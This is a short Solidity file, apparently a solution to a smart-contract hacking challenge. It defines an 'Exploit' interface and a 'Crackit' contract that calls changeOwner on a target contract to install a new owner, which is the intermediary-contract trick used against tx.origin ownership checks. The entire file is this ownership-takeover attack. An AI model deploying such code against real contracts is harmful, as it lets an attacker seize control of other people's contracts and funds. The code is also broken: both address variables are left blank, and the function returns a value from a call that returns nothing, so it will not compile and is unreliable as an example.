// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Exploit {
    function changeOwner(address _owner) external;
}

contract Crackit {

  address targetAddr = ;
  address newOwner = ;
  
  function crackIt() external {

      return Exploit(targetAddr).changeOwner(newOwner);

  }

}
